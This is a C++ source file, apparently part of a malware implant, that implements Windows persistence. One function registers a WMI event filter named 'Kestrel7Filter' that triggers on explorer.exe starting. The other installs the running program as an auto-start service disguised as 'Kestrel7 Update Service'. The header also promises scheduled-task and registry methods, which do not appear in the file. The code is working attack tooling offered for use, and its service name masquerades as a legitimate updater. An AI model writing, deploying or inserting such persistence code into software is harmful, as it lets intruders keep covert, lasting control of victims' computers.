// persistence.cpp - WMI, Scheduled Tasks, Registry, Service
#include <windows.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <stdio.h>

#pragma comment(lib, "wbemuuid.lib")

void CreateWMIEvent() {
    HRESULT hres;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    
    // Create WMI Event Filter
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pInstance = NULL;
    hres = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pClass, NULL);
    hres = pClass->SpawnInstance(0, &pInstance);
    
    VARIANT vName;
    VariantInit(&vName);
    vName.vt = VT_BSTR;
    vName.bstrVal = SysAllocString(L"Kestrel7Filter");
    pInstance->Put(L"Name", 0, &vName, 0);
    
    VARIANT vQuery;
    VariantInit(&vQuery);
    vQuery.vt = VT_BSTR;
    vQuery.bstrVal = SysAllocString(L"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'");
    pInstance->Put(L"Query", 0, &vQuery, 0);
    
    VARIANT vQueryLang;
    VariantInit(&vQueryLang);
    vQueryLang.vt = VT_BSTR;
    vQueryLang.bstrVal = SysAllocString(L"WQL");
    pInstance->Put(L"QueryLanguage", 0, &vQueryLang, 0);
    
    // Commit filter
    IWbemClassObject* pResult = NULL;
    hres = pSvc->PutInstance(pInstance, 0, NULL, &pResult);
}

void AddStartupService() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        SC_HANDLE hService = CreateServiceA(hSCM, "Kestrel7Update", "Kestrel7 Update Service",
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL);
        if (hService) {
            StartService(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
}
